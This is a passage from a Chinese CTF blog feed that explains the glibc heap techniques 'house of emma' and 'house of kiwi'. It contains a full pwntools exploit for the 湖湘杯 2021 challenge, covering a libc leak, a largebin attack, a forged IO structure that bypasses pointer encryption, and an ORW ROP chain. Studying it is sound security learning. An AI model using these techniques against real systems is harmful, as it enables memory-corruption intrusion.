python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-number">0x7bc53c6789c0</span> &lt;_IO_cookie_read&gt;       endbr64 <br>  <span class="hljs-number">0x7bc53c6789c4</span> &lt;_IO_cookie_read+<span class="hljs-number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="hljs-number">0xe8</span>]<br>  <span class="hljs-number">0x7bc53c6789cb</span> &lt;_IO_cookie_read+<span class="hljs-number">11</span>&gt;    ror    rax, <span class="hljs-number">0x11</span>  <br>  <span class="hljs-number">0x7bc53c6789cf</span> &lt;_IO_cookie_read+<span class="hljs-number">15</span>&gt;    xor    rax, qword ptr fs:[<span class="hljs-number">0x30</span>] <span class="hljs-comment">#解密处理</span><br>  <span class="hljs-number">0x7bc53c6789d8</span> &lt;_IO_cookie_read+<span class="hljs-number">24</span>&gt;    test   rax, rax<br>► <span class="hljs-number">0x7bc53c6789db</span> &lt;_IO_cookie_read+<span class="hljs-number">27</span>&gt;    je     _IO_cookie_read+<span class="hljs-number">38</span>                &lt;_IO_cookie_read+<span class="hljs-number">38</span>&gt;<br><br>  <span class="hljs-number">0x7bc53c6789dd</span> &lt;_IO_cookie_read+<span class="hljs-number">29</span>&gt;    mov    rdi, qword ptr [rdi + <span class="hljs-number">0xe0</span>]<br>  <span class="hljs-number">0x7bc53c6789e4</span> &lt;_IO_cookie_read+<span class="hljs-number">36</span>&gt;    jmp    rax  <span class="hljs-comment">#call rax</span><br></code></pre></td></tr></table></figure><p><strong>可以看见call rax 也就是我们如果控制了rax那么就可以控制程序流，但是在此之前可以看见对rax进行了解密处理，将rax循环右移0x11，然后再和fs+0x30处的位置异或得到最后的rax</strong></p><p><strong>最后去查了一下，这个是glibc的<a href="https://sourceware.org/glibc/wiki/PointerEncryption">PointerEncryption</a>（自指针加密），是glibc保护指针的一种方式，glibc是这样解释的：指针加密是 glibc 的一项安全功能，旨在增加攻击者在 glibc 结构中操纵指针（尤其是函数指针）的难度。此功能也称为 “指针修饰” 或 “指针守卫”。</strong></p><p><strong>这个值存放在TLS段上，一般情况下我们泄露不了，但是我们可以通过largebin_attack把一个堆块地址写入这个地址，那么key就变成了堆块指针，所以我们只需要，进行相应的加密就可以控制rax达到任意地址。那么如果控制这个rax为system(“&#x2F;bin&#x2F;sh”)的地址，那么就可以跳转到此处执行shell。</strong></p><p><strong>然而还有一个问题，就是如果程序使用了沙箱禁用了execve，那么还是要进行迁移，需要用到setcontext，但是我们知道，这个函数再glibc2.29以后控制的寄存器从原来的rdi变成了rdx，也就是我们要控制rdx的值，但是当处于*<em>_IO_cookie_read，会发现此时rdx的值为0，而rdi也就是我们伪造的fake_io堆块，那么需要一个gadget，既能将rdi mov到rdx，又能继续接下来的程序流。*</em></strong></p><p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913141818872-216299118.png" alt="img"></strong></p><p><em><strong>*那么可以找到这样的一个gadget*</strong></em></p><p><em><strong>*<img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142155352-833767926.png" alt="img">*</strong></em></p><p><em><strong>*这个gadget可以将rdi+8处地址给rdx，而且最后call rdx+0x20那么我们久可以继续控制程序流了。*</strong></em></p><p><strong>怎么控制呢，如果把rdx+0x20的地方给setcontext+61的话，可以继续控制rdx+0xe0和rdx+0xe8的位置，那么就可以控制程序流进行orw</strong></p><h3 id="例题：-湖湘杯-2021-house-of-emma"><a href="#例题：-湖湘杯-2021-house-of-emma" class="headerlink" title="例题：[湖湘杯 2021]house_of_emma"></a><strong>例题：</strong>[湖湘杯 2021]house_of_emma</h3><p><strong>这个题目是一个vm的题目，需要输入opcode，来执行相应的效果。但是我们重心在house_of_emma上，但是这个opcode可以看看最后的exp，也不难理解，类似对你输入的指令进行8位分割</strong></p><p><strong>add函数申请堆块大小在0x40f到0x500之间</strong></p><p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142805490-1090431446.png" alt="img"></strong></p><p><strong>edit函数不能修改堆块之外的数据</strong></p><p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142844429-1808357340.png" alt="img"></strong></p><p><strong>问题出在free函数，存在uaf漏洞</strong></p><p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142915978-1396030382.png" alt="img"></strong></p><p><strong>show函数</strong></p><p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142952490-1829861897.png" alt="img"></strong></p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析：</strong></h3><p><strong>本题libc给的是2.34的，那么__free_hook，malloc_hook等被移除了，当然因为存在UAF，而且还可以edit,那么泄露libc地址和heap地址会很容易，我们要伪造IO链，因为最后会使用stdder实现报错输出，所以我们可以劫持这个链子，将_lock给成合法地址，vtable给成 *<em>_IO_cookie_jumps+0x38，前面提到了这样是因为最后会call _IO_cookie_jumps+0x38再加上0x38的地址，就会到_IO_cookie_read，然后使用call rax的gadget布置rdx，然后call rdx+0x20 进入setcontxt + 61,然后就是orw了。*</em></strong></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="*EXP：*"></a><em><strong>*EXP：*</strong></em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>io = process(<span class="hljs-string">&quot;emma&quot;</span>)<br><br><br>opcode = <span class="hljs-string">b&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x01&#x27;</span>+p8(index)+p16(size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x02&#x27;</span>+p8(index)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x03&#x27;</span>+p8(index)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x04&#x27;</span> + p8(index) + p16(<span class="hljs-built_in">len</span>(msg)) + msg<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x05&#x27;</span><br>    io.sendafter(<span class="hljs-string">&quot;Pls input the opcode&quot;</span>,opcode)<br>    opcode = <span class="hljs-string">b&quot;&quot;</span><br><br><span class="hljs-comment"># 加密函数 循环左移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_left_64</span>(<span class="hljs-params">x, n</span>):<br>    <span class="hljs-comment"># 确保移动的位数在0-63之间</span><br>    n = n % <span class="hljs-number">64</span><br>    <span class="hljs-comment"># 先左移n位</span><br>    left_shift = (x &lt;&lt; n) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>    <span class="hljs-comment"># 然后右移64-n位，将左移时超出的位移动回来</span><br>    right_shift = (x &gt;&gt; (<span class="hljs-number">64</span> - n)) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>    <span class="hljs-comment"># 合并两部分</span><br>    <span class="hljs-keyword">return</span> left_shift | right_shift<br><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x420</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x410</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x430</span>)<br>show(<span class="hljs-number">2</span>)<br>run()<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done\n&quot;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x1f30b0</span><br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>pop_rdi_addr = libc_base + <span class="hljs-number">0x000000000002daa2</span> <span class="hljs-comment">#: pop rdi; ret; </span><br>pop_rsi_addr = libc_base + <span class="hljs-number">0x0000000000037c0a</span> <span class="hljs-comment">#: pop rsi; ret; </span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x00000000001066e1</span> <span class="hljs-comment">#: pop rdx; pop r12; ret;</span><br>pop_rax_addr = libc_base + <span class="hljs-number">0x00000000000446c0</span> <span class="hljs-comment">#: pop rax; ret;</span><br>syscall_addr = libc_base + <span class="hljs-number">0x00000000000883b6</span> <span class="hljs-comment">#: syscall; ret;</span><br>setcontext_addr = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>]<br>stderr = libc_base + libc.sym[<span class="hljs-string">&quot;stderr&quot;</span>]<br>open_addr = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]+libc_base<br>read_addr = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write_addr = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><br><br><br><span class="hljs-comment">#suc(&quot;guard&quot;,guard)</span><br>_IO_cookie_jumps = libc_base + <span class="hljs-number">0x1f3ae0</span> <br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>run()<br>io.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x2ae0</span> <br>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br>guard = libc_base+ <span class="hljs-number">0x20d770</span><br>suc(<span class="hljs-string">&quot;guard&quot;</span>,guard)<br><br>free(<span class="hljs-number">0</span>)<br>payload = p64(libc_base + <span class="hljs-number">0x1f30b0</span>)*<span class="hljs-number">2</span> + p64(heap_base +<span class="hljs-number">0x2ae0</span>) + p64(stderr - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">2</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">2</span>,p64(heap_base + <span class="hljs-number">0x22a0</span>) + p64(libc_base + <span class="hljs-number">0x1f30b0</span>) + p64(heap_base + <span class="hljs-number">0x22a0</span>) * <span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>, p64(libc_base + <span class="hljs-number">0x1f30b0</span>) + p64(heap_base + <span class="hljs-number">0x2ae0</span>) * <span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x420</span>)<br>run()<br><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x430</span>)<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">2</span>, p64(libc_base + <span class="hljs-number">0x1f30b0</span>) * <span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x2ae0</span>) + p64(guard - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x450</span>)<br>edit(<span class="hljs-number">2</span>, p64(heap_base + <span class="hljs-number">0x22a0</span>) + p64(libc_base + <span class="hljs-number">0x1f30b0</span>) + p64(heap_base + <span class="hljs-number">0x22a0</span>) * <span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>, p64(libc_base + <span class="hljs-number">0x1f30b0</span>) + p64(heap_base + <span class="hljs-number">0x2ae0</span>) * <span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x420</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x410</span>)<br><br><br><span class="hljs-comment">#gdb.attach(io)</span><br>run()<br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x438</span> + p64(<span class="hljs-number">0x300</span>))<br>run()<br><br><br><br>flag = heap_base + <span class="hljs-number">0x22a0</span> + <span class="hljs-number">0x260</span><br><br>orw =p64(pop_rdi_addr)+p64(flag)<br>orw+=p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)<br>orw+=p64(pop_rax_addr)+p64(<span class="hljs-number">2</span>)<br>orw+=p64(syscall_addr)<br><br><br>orw+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)<br>orw+=p64(pop_rsi_addr)+p64(heap_base+<span class="hljs-number">0x1050</span>)     <span class="hljs-comment"># 从地址 读出flag</span><br>orw+=p64(pop_rdx_r12)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)<br>orw+=p64(read_addr)<br><br><br>orw+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)<br>orw+=p64(pop_rsi_addr)+p64(heap_base+<span class="hljs-number">0x1050</span>)     <span class="hljs-comment"># 从地址 读出flag</span><br>orw+=p64(pop_rdx_r12)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)<br>orw+=p64(write_addr)<br><br><br><br><br>gadget = libc_base + <span class="hljs-number">0x146020</span>  <span class="hljs-comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br>chunk0 = heap_base + <span class="hljs-number">0x22a0</span><br>xor_key = chunk0<br>suc(<span class="hljs-string">&quot;xor_key&quot;</span>,xor_key)<br><br>fake_io = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># IO_read_end IO_read_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># IO_write_base IO_write_ptr IO_write_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># IO_buf_base IO_buf_end</span><br>fake_io += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span> <span class="hljs-comment">#_IO_save_base ~ _codecvt</span><br>fake_io += p64(heap_base) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>  <span class="hljs-comment">#_lock   _offset  _codecvt</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xc8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>fake_io += p64(_IO_cookie_jumps+<span class="hljs-number">0x38</span>) <span class="hljs-comment">#vtable</span><br>rdi_data = chunk0 + <span class="hljs-number">0xf0</span><br>rdx_data = chunk0 + <span class="hljs-number">0xf0</span><br><br><br>encrypt_gadget = rotate_left_64(gadget^xor_key,<span class="hljs-number">0x11</span>)<br>fake_io += p64(rdi_data)<br>fake_io += p64(encrypt_gadget)<br>fake_io += p64(<span class="hljs-number">0</span>) + p64(rdx_data)<br>fake_io += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(setcontext_addr + <span class="hljs-number">61</span>)<br>fake_io += p64(<span class="hljs-number">0xdeadbeef</span>)<br>fake_io += <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xa0</span> - <span class="hljs-number">0x30</span>)<br>fake_io += p64(chunk0+<span class="hljs-number">0x1a0</span>)+p64(pop_rdi_addr+<span class="hljs-number">1</span>)<br>fake_io += orw<br>fake_io += p64(<span class="hljs-number">0xdeadbeef</span>)<br>fake_io += <span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span><br>edit(<span class="hljs-number">0</span>,fake_io)<br>run()<br><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x4c0</span>)<br>gdb.attach(io)<br>run()<br>io.interactive()<br></code></pre></td></tr></table></figure><p><strong>gdaget call rax</strong></p><p><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144050249-222088011.png" alt="img"></p><p><strong>call setcontext +61</strong></p><p><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144159525-165967660.png" alt="img"></p><p><strong>实现迁移</strong></p><p><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144241621-1184910082.png" alt="img"></p><p><strong>最终效果</strong></p><p><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144310643-1290084998.png" alt="img"></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h3><p><strong>我个人感觉这个威力还是不小的，但是打远程的话需要爆破tls地址这个比较麻烦，无论是house_of_kiwi还是house_of_emma都是利用了__malloc_assest，但是遗憾的是，这个函数在后来的libc中，不能处理IO了，最后甚至去掉了，但是在这之前的版本还是可以利用的。</strong></p><p><strong>最后这个题目的附件在NSSCTF平台上面有，有兴趣的师傅可以试一下。</strong></p><p><strong>The best way to predict the future is to create it.</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常回家看看之house_of_kiwi</title>
    <link href="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/"/>
    <url>/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/</url>
    
    <content type="html"><![CDATA[<h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a><strong>前言：</strong></h3><p><strong>house_of_kiwi 一般是通过触发__malloc_assert来刷新IO流，最后可以劫持程序流或者通过和setcontext来打配合来进行栈迁移来得到flag。</strong></p><p><strong>我们看看触发的源码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_IN (libc)</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> __assert_fail(assertion, file, <span class="hljs-keyword">line</span>, function)\</span><br><span class="hljs-meta"> __malloc_assert(assertion, file, <span class="hljs-keyword">line</span>, function)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__progname;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>     __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>     file, line,<br>     function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>     assertion);<br>  fflush (<span class="hljs-built_in">stderr</span>);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><strong>可以看见*<em>__malloc_assert调用了<code>__fxprintf</code>和<code>fflush</code>，而这个函数调用后会调用<code>_IO_file_jumps</code>中的<code>sync</code>指针。*</em></strong></p><p><em><strong>*这个指针在<code>_IO_file_jumps</code>偏移为0x60的位置，那么将这个指针进行劫持，就能达到我们想要的目的，如果题目禁用了execve的话，可以考虑通过setcontext来实现栈迁移*</strong></em></p><p><em><strong>*我们看一下这个这个函数*</strong></em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000053030</span> ; __unwind &#123;<br>.text:<span class="hljs-number">0000000000053030</span>                 endbr64<br>.text:<span class="hljs-number">0000000000053034</span>                 push    rdi<br>.text:<span class="hljs-number">0000000000053035</span>                 lea     rsi, [rdi+<span class="hljs-number">128</span>h] ; nset<br>.text:<span class="hljs-number">000000000005303</span>C                 xor     edx, edx        ; oset<br>.text:<span class="hljs-number">000000000005303</span>E                 mov     edi, <span class="hljs-number">2</span>          ; how<br>.text:<span class="hljs-number">0000000000053043</span>                 mov     r10d, <span class="hljs-number">8</span>         ; sigsetsize<br>.text:<span class="hljs-number">0000000000053049</span>                 mov     eax, <span class="hljs-number">0</span>Eh<br>.text:<span class="hljs-number">000000000005304</span>E                 syscall                 ; LINUX - sys_rt_sigprocmask<br>.text:<span class="hljs-number">0000000000053050</span>                 pop     rdx<br>.text:<span class="hljs-number">0000000000053051</span>                 cmp     rax, <span 